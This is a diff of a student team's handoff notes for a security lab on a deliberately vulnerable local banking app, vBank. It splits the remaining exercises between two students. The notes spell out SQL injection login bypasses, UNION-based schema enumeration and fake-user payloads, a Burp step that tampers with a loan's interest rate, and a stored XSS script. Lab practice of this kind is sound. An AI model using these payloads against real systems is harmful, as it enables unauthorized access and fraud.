@@ -6,164 +6,145 @@
 
 ---
 
-## Overview
+## Current Status
 
-This document summarizes what we've done, the challenges encountered, and what still needs to be completed. Use this as a reference when working on the report or continuing with the remaining exercises.
-
----
-
-## Exercise 1: Setup (COMPLETED)
-
-### What we did:
-- Installed Docker and ran the vBank application using Docker Compose
-- Three containers: PHP/Apache web server (port 8080), MySQL 8.0 (port 3306), phpMyAdmin (port 8081)
-- Imported `vbank.sql` database via phpMyAdmin
-
-### Issues & Fixes:
-
-1. **Missing mysqli extension**
-   - The `php:8.1-apache` image doesn't include the `mysqli` PHP extension
-   - Created a `Dockerfile` with `RUN docker-php-ext-install mysqli`
-   - Changed `docker-compose.yml` from `image: php:8.1-apache` to `build: .`
-
-2. **Include path mismatch**
-   - `index.php` and `login.php` had `../etc/` and `../pages/` in include paths
-   - Files are mounted at `/var/www/html/`, so paths should be `./etc/` and `./pages/`
-   - Fixed in both `index.php:12` and `login.php:2`
-
-3. **Deprecated `each()` function (PHP 8)**
-   - `each()` was removed in PHP 8.0
-   - Replaced with `foreach` loops in `index.php` and `htb.inc`
-
-4. **Deprecated `eregi()` function**
-   - Replaced with `preg_match()` in `htb.inc:98`
-
-5. **Deprecated `mysql_*` functions**
-   - Replaced `mysql_errno()` and `mysql_error()` with `mysqli_errno()` and `mysqli_error()` in `htb.inc`
-
-6. **Database connection config**
-   - `config.php` had hardcoded `127.0.0.1` as DB host and password `aaa`
-   - In Docker, DB is in a separate container named `db` with password `root`
-   - Updated to use environment variables: `getenv('DB_HOST')`, `getenv('DB_PASSWORD')`, etc.
-
-7. **Path prefix**
-   - Changed `$htbconf['paths/prefix']` from `/var/www/vBank/` to `/var/www/html/`
+| Exercise | Status | Who |
+|----------|--------|-----|
+| Exercise 1: Setup | DONE | Ghazal |
+| Exercise 2: Client/Server Side Scripting | DONE | Ghazal |
+| Exercise 3: SQL Injection | DONE | Ghazal |
+| Exercise 4: SQL Injection - New User | DONE (needs screenshots) | **Seth** |
+| Exercise 5: Request Manipulation | NOT STARTED | **Seth** |
+| Exercise 6: XSS | NOT STARTED | **Seth** |
 
 ---
 
-## Exercise 2: Client/Server Side Scripting (PARTIALLY DONE - NEEDS IMPROVEMENT)
+## What Ghazal Already Did
 
-### What we identified:
-- The login form uses `checkform()` from `htb.js` for client-side validation
-- It only allows alphanumeric characters (`[a-zA-Z0-9]`) in username and password
-- The server (`login.php`) performs NO input validation - it directly concatenates input into SQL queries
+### Exercise 1: Setup
+- Docker setup with PHP 8.1, MySQL 8.0, phpMyAdmin
+- Fixed all PHP 8 compatibility issues
+- LaTeX chapter: `setup_chapter.tex`
+- Images: `images/` folder (12 screenshots)
 
-### What we did:
-- Used browser Console to bypass: `document.loginForm.submit()`
-- Successfully bypassed client-side validation
-- Reached the server (got server errors, proving bypass worked)
+### Exercise 2: Client/Server Side Scripting
+- Identified `checkform()` in `htb.js` as client-side protection
+- Bypassed using direct URL request to `login.php`
+- LaTeX chapter: `exercise2_chapter.tex`
+- Images: `images/exercise-2/` folder
 
-### Why I'm NOT satisfied:
-1. We used the Console method which is not ideal for screenshots/documentation
-2. The cleaner method is **disabling JavaScript** in browser settings (`about:config` → `javascript.enabled = false`)
-3. With JS disabled, we can type special characters directly in the form fields and click Login
-4. We need proper screenshots showing:
-   - The JS validation in `htb.js`
-   - The form with special characters (###) in the fields
-   - The successful bypass result
+### Exercise 3: SQL Injection
+- Login bypass via URL: `' OR 1=1 --`
+- Password change bypass: `' or 'a'='a`
+- Changed bob's password using targeted injection
+- LaTeX chapter: `exercise3_4_chapter.tex` (combined with Exercise 4)
+- Images: `images/exercise-3/` folder (4 screenshots)
 
-### What Seth should do:
-1. **Disable JavaScript** in Firefox: `about:config` → `javascript.enabled` → set to `false`
-2. Refresh the login page
-3. Enter in the form:
-   - Username: `###`
-   - Password: `###`
-4. Click Login - should bypass JS validation and reach the server
-5. Take screenshots of each step:
-   - Screenshot 1: The `checkform()` function in `htb.js` showing the regex validation
-   - Screenshot 2: The login form with `###` in both fields (showing special characters accepted)
-   - Screenshot 3: The result page (error or successful bypass proving client-side check was skipped)
+### Exercise 4: SQL Injection - New User (TEXT DONE, NEEDS SCREENSHOTS)
+- The LaTeX content is already written in `exercise3_4_chapter.tex`
+- Describes ORDER BY injection, UNION SELECT, and creating virtual user
+- **Seth: You just need to take screenshots and add them**
 
 ---
 
-## Exercise 3: SQL Injection (NOT STARTED)
+## What Seth Needs To Do
 
-### What needs to be done:
+### Exercise 4: Take Screenshots (5 min)
 
-**Step 1: Login bypass with SQL injection**
-- Disable JavaScript in browser (`about:config` → `javascript.enabled = false`)
-- Login with:
-  - Username: `' or 'a'='a`
-  - Password: `x`
-- This makes the query: `SELECT * FROM users where username='' or 'a'='a' and password='x'`
-- Logs in as first user (alex)
-- **Screenshot:** Welcome page showing "Alex Lexo"
+The text is already done. You just need to perform the attacks and take screenshots:
 
-**Step 2: Change your own password**
-- Go to password change page
-- Old password: `' or 'a'='a`
-- New password: `hacked`
-- Retype: `hacked`
-- **Screenshot:** Success message "Your password has successfully been changed"
+**Step 1: Find columns with ORDER BY**
+- URL: `http://localhost:8080/login.php?username=test&password=' ORDER BY 1 --`
+- Increment until error at 9
+- **Screenshot:** The error at ORDER BY 9
+- Save as: `images/exercise-3/05_order_by_error.png`
 
-**Step 3: Change another user's password (bob)**
-- Log out
-- Disable JS again
-- Login as bob:
-  - Username: `' or username='bob'#`
-  - Password: `x`
-- This makes the query: `SELECT * FROM users where username='' or username='bob'#'' and password='x'`
-- The `#` comments out the rest of the query
-- **Screenshot:** Welcome page showing "Bob Obby"
-- Go to password change and change bob's password using same method
+**Step 2: Find printed columns**
+- URL: `http://localhost:8080/login.php?username=test&password=' UNION SELECT 1,2,3,4,5,6,7,8 --`
+- **Screenshot:** Welcome page showing numbers (columns 3,4,5 are displayed)
+- Save as: `images/exercise-3/06_union_select.png`
 
-### Note:
-- The `htbchgpwd.page` file has been fixed for PHP 8 compatibility (mysql_query → mysqli_query)
-- If you get any errors, let Ghazal know
+**Step 3: Get database info**
+- URL: `http://localhost:8080/login.php?username=test&password=' UNION SELECT 1,2,database(),4,5,6,7,8 --`
+- **Screenshot:** Shows "vbank" as database name
+- Save as: `images/exercise-3/07_database_name.png`
 
----
+**Step 4: Get table names**
+- URL: `http://localhost:8080/login.php?username=test&password=' UNION SELECT 1,2,group_concat(table_name),4,5,6,7,8 FROM information_schema.tables WHERE table_schema='vbank' --`
+- **Screenshot:** Shows table names (accounts, users, etc.)
+- Save as: `images/exercise-3/08_table_names.png`
 
-## Exercise 4: SQL Injection - Create New User (NOT STARTED)
+**Step 5: Create fake user**
+- URL: `http://localhost:8080/login.php?username=test&password=' UNION SELECT 99,'hacker','hacker','Passau','Student',NULL,NULL,NULL --`
+- **Screenshot:** Welcome page showing "Student Hacker"
+- Save as: `images/exercise-3/09_fake_user.png`
 
-### What needs to be done:
-1. Use UNION-based injection to enumerate database structure
-2. Find number of columns using `ORDER BY` injection
-3. Identify which columns are displayed on the page using `UNION SELECT`
-4. Inject a fake user via UNION SELECT payload
-
-### Key payloads:
-- Find columns: `' ORDER BY 1 --` (increment until error)
-- Find displayed columns: `' UNION SELECT 1,2,3,4,5,6,7,8 --`
-- Get database info: `' UNION SELECT 1,2,database(),4,5,6,7,8 --`
-- Get table names: `' UNION SELECT 1,2,group_concat(table_name),4,5,6,7,8 FROM information_schema.tables WHERE table_schema='vbank' --`
-- Create fake user: `' UNION SELECT 99,'hacker','hacker','Passau','Student',NULL,NULL,NULL --`
+**After screenshots:** Tell Ghazal and she will add them to the LaTeX file.
 
 ---
 
-## Exercise 5: Request Manipulation (NOT STARTED)
+### Exercise 5: Request Manipulation (30-45 min)
 
-### What needs to be done:
-1. Install a proxy tool (Burp Suite or OWASP ZAP)
-2. Intercept loan request
-3. Modify interest rate parameter (e.g., change from 4.2 to 0)
-4. Forward modified request
+**Goal:** Intercept a loan request and modify the interest rate.
+
+**Steps:**
+1. Install Burp Suite (or use OWASP ZAP)
+2. Configure Firefox to use Burp as proxy (127.0.0.1:8080)
+3. Enable Intercept in Burp
+4. Login to vBank normally (alex / hacked)
+5. Go to "Request a Loan" page
+6. Fill in loan form and submit
+7. Burp intercepts the request
+8. Find the `interest` parameter (value: 4.2)
+9. Change it to `0`
+10. Forward the request
+11. Check "My Loans" page - loan should show 0% interest
+
+**Screenshots needed:**
+- Burp Suite intercepting the request with modified interest
+- The loan showing 0% interest in "My Loans" page
+
+**Save as:** `images/exercise-5/01_burp_intercept.png` and `images/exercise-5/02_loan_0_percent.png`
+
+**What to write:** The vulnerable code accepts user-submitted interest rate without server-side validation. Vulnerability name: Insecure Direct Parameter Manipulation (Broken Access Control).
 
 ---
 
-## Exercise 6: XSS (NOT STARTED)
+### Exercise 6: XSS (30-45 min)
 
-### What needs to be done:
-1. Find a field that reflects input (e.g., transfer remark)
-2. Inject JavaScript payload
-3. Demonstrate script execution
+**Goal:** Inject JavaScript that executes in other users' browsers.
+
+**Steps:**
+1. Login normally (alex / hacked)
+2. Go to "Transfer Money" page
+3. In the "Remark" field, inject:
+   ```
+   <script>alert('XSS');</script>
+   ```
+4. Submit the transfer
+5. When other users view their transactions, the alert pops up
+
+**Alternative injection point:** The transfer remark is displayed on the transactions page without sanitization.
+
+**Screenshots needed:**
+- The alert popup appearing
+- The remark field with the payload
+
+**Save as:** `images/exercise-6/01_xss_alert.png` and `images/exercise-6/02_xss_payload.png`
+
+**What to write:** The application fails to sanitize user input in the remark field before displaying it. Vulnerability: Reflected/Stored XSS. Fix: HTML-encode all user input before rendering.
 
 ---
 
-## Important Notes
+## Important Info
 
 ### Test credentials:
-- alex / 413Xp455
-- bob / b0BP4S5
+- alex / hacked (password was changed during Exercise 3)
+- bob / hacked (password was changed during Exercise 3)
+
+### URLs:
+- Application: http://localhost:8080
+- phpMyAdmin: http://localhost:8081 (root/root)
 
 ### Docker commands:
 ```bash
@@ -172,29 +153,23 @@ docker-compose down
 docker-compose up --build -d
 ```
 
-### URLs:
-- Application: http://localhost:8080
-- phpMyAdmin: http://localhost:8081 (root/root)
-
-### Files modified so far:
+### Files modified (PHP 8 compatibility):
 - `Dockerfile` (created)
-- `docker-compose.yml` (changed `image:` to `build:`)
-- `app/index.php` (include paths, each() fix, login constant quote)
+- `docker-compose.yml` (build instead of image)
+- `app/index.php` (include paths, each() fix)
 - `app/login.php` (include paths)
-- `app/etc/config.php` (DB credentials, path prefix)
-- `app/etc/htb.inc` (each(), eregi(), mysql_* fixes, errorHandler default param)
-- `app/pages/htbchgpwd.page` (mysql_query → mysqli_query for PHP 8)
+- `app/etc/config.php` (DB credentials)
+- `app/etc/htb.inc` (each(), eregi(), mysql_* fixes)
+- `app/pages/htbchgpwd.page` (mysql_query -> mysqli_query)
 
----
-
-## Report Structure
-
-The LaTeX chapter files are at:
+### LaTeX files:
 - `setup_chapter.tex` - Exercise 1
 - `exercise2_chapter.tex` - Exercise 2
+- `exercise3_4_chapter.tex` - Exercise 3 + 4 (combined)
 
-Images are in:
-- `images/` - Exercise 1 screenshots
-- `insider-lab/agent/images/exercise-2/` - Exercise 2 screenshots
-
-The main PDF reference is at: `insider-lab/Lab_4.pdf`
+### Image folders:
+- `images/` - Exercise 1 (12 screenshots)
+- `images/exercise-2/` - Exercise 2
+- `images/exercise-3/` - Exercise 3 + 4
+- `images/exercise-5/` - Exercise 5 (Seth creates)
+- `images/exercise-6/` - Exercise 6 (Seth creates)
